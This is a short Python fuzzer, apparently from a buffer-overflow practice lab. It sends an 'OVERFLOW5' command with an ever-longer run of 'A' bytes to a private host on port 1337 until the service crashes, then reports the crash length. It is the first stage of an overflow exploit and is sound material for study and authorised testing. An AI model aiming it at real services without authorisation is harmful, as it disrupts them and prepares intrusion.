#!/usr/bin/python3

import sys, socket
from time import sleep

host = '10.10.142.189'
port = 1337

function = b'OVERFLOW5 '


def fuzzer(host, port):
	
	payload = b''

	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))
			s.send(function + payload)
			sleep(.25)
			payload += b'A' * 100
			print("fuzzing at %s bytes.." % str(len(payload)))

		except Exception as err:
			print(err)
			print("fuzzer crashed. -> %s bytes.." % str(len(payload)))
			sys.exit()


if __name__ == '__main__':
	fuzzer(host, port)
